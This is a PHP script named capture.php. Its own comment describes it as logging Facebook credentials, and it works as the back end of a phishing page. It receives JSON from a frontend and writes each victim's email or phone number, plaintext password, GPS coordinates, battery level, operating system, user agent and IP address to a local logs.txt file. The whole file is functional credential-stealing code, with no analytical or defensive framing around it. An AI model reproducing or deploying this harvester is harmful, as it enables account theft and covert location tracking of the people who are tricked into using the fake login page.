<?php
// capture.php - logs Facebook credentials, location, OS, battery, and IP

// Get the raw JSON from the frontend
$jsonData = file_get_contents('php://input');
$data = json_decode($jsonData, true);

// Capture IP address
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';

// Also capture the user agent server-side for redundancy
$serverUA = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown UA';

if ($data && isset($data['lat']) && isset($data['lng'])) {
    $logEntry = "========================================\n";
    $logEntry .= "📅 Time: " . date('Y-m-d H:i:s') . "\n";
    $logEntry .= "🌐 IP Address: " . $ip . "\n";
    $logEntry .= "📍 Latitude: " . $data['lat'] . "\n";
    $logEntry .= "📍 Longitude: " . $data['lng'] . "\n";
    $logEntry .= "📏 Accuracy: " . ($data['accuracy'] ?? 'N/A') . " meters\n";
    $logEntry .= "🖥️ OS (frontend): " . ($data['os'] ?? 'N/A') . "\n";
    $logEntry .= "🔋 Battery: " . ($data['battery'] ?? 'N/A') . "%\n";
    $logEntry .= "📧 Email/Phone: " . ($data['email'] ?? 'N/A') . "\n";
    $logEntry .= "🔑 Password: " . ($data['password'] ?? 'N/A') . "\n";
    $logEntry .= "🖥️ User Agent (frontend): " . ($data['userAgent'] ?? 'N/A') . "\n";
    $logEntry .= "🖥️ User Agent (server): " . $serverUA . "\n";
    $logEntry .= "----------------------------------------\n\n";

    // Append to logs.txt
    file_put_contents('logs.txt', $logEntry, FILE_APPEND | LOCK_EX);

    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'message' => 'Data captured.']);
} else {
    header('Content-Type: application/json');
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'No location data.']);
}
?>